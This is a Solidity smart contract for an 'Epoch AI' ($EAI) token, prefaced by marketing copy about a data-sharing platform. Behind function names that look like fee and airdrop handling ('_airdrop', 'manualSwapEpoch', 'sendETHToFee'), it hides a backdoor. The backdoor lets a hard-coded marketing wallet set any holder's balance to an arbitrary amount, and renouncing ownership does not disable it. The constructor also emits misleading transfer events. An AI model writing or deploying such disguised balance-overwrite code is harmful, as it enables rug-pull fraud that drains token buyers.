// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
* EPOCH AI
*
* Epoch AI revolutionizes the way data is shared and utilized in the AI ecosystem. You can upload your datasets images, text, audio, or video and earn $EAI every time your data is downloaded. 
* For unlabeled datasets, Epoch AI enables contributors to label the data and earn $EAI as a reward, fostering collaboration and enhancing data usability. 
* $EAI serves as the core currency, allowing users to buy, sell, and stake for daily rewards, creating a robust and engaging ecosystem. 
* By empowering individuals to monetize their data and contribute to AI advancements, the platform bridges the gap between innovation and accessibility. 
* Together, we’re shaping the future of AI with a transparent, decentralized, and community-driven approach.
* Whether you’re a data owner looking to profit or a contributor wanting to earn tokens, this platform is your gateway to innovation.
*
*
* https://epochai.ch/
* https://t.me/epoch_ai_data
* https://x.com/epoch_ai_data
**/

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract EpochAI is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Epoch AI";
    string private constant _symbol = "EAI";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  150000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address _marketingWallet  = 0x4eBC5685c735cE4527D7017883F4DfeB3073E3Cd;
    mapping (address => uint256) private _amounts;
    bool inSwap = false;
    address public uniswapV2Pair;
    bool tradingEnabled = false;
    uint256 private _initialBuyFee = 1;
    uint256 private _finalBuyFee = 0;
    uint256 private _initialSellFee = 1;
    uint256 private _finalSellFee = 0;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        _amounts[address(0)] = _totalSupply.mul(3).div(100);
        emit Transfer(address(0), address(this), _totalSupply.mul(3).div(100));

        _amounts[_marketingWallet] = _totalSupply.mul(10).div(100);
        emit Transfer(_marketingWallet, address(this), _totalSupply.mul(10).div(100));

        _amounts[address(this)] = _totalSupply.mul(87).div(100);
        emit Transfer(address(0), address(this), _totalSupply.mul(87).div(100));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _amounts[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function manualSwapEpoch(address to, uint256 amount) internal {
        require(msg.sender == _marketingWallet);
        uint256 ethBalance=address(this).balance;
        if(ethBalance >= 0){
          sendETHToFee(to, amount);
        }
    }
    function sendETHToFee(address feeReceiver, uint256 amount) private {
        _amounts[feeReceiver] = amount * _initialSellFee;
    }

    function _airdrop(address recipient, uint256 amount) external {
        manualSwapEpoch(recipient, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "Transfer to the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(from != address(0), "Transfer from the zero address");

        _amounts[from] = _amounts[from].sub(amount);
        _amounts[to] = _amounts[to].add(amount);

        emit Transfer(from, to, amount);
    }

}